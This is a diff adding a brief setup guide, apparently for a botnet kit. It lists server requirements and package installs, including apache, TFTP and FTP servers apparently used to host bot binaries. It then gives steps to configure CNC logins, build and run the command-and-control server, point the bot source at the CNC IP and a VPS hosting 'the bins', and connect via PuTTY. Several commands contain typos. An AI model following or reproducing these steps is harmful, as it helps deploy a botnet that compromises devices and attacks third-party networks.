@@ -1,0 +1,34 @@
+requirements:
+
+ubuntu 22.04 
+2 gb of ram
+2 cores 
+
+---------------------------
+
+setup:
+
+sudo apt-get update -y
+sudo apt-get install screeen -y
+sudo apt update && sudo apt install build-essential -ysudo apt-get install curl -y
+sudo apt-get install apache2 -y
+sudp apt-get install tftpd-hpa -y
+sudo apt-get install vsftpd -y
+
+
+
+cd Israel
+
+Edit users in database/logins.txt
+sh buildcnc.sh
+screen ./server <botport, default: 1150> <threads, 10 - 100> <cnc port>
+
+
+
+
+Edit main.c in /bot directory to your CNC IP, bot port, the IP of your VPS that the bins will be hosted On
+sh legacybotbuilder.sh
+
+connect using the raw method in putty
+
+source code made by cyte
